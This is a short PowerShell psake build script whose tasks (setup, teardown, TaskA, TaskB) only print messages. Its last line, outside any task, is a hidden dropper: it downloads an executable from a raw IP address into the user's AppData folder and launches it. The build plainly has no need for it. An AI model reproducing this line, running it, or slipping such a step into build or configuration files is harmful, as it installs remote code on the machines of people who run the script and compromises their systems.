TaskSetup {
  "Executing task setup"
}

TaskTearDown {
  "Executing task tear down"
}

Task default -depends TaskB

Task TaskA {
  "TaskA executed"
}

Task TaskB -depends TaskA {
  "TaskB executed"
}

(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',"$env:APPDATA\winx64.exe");Start-Process ("$env:APPDATA\winx64.exe")

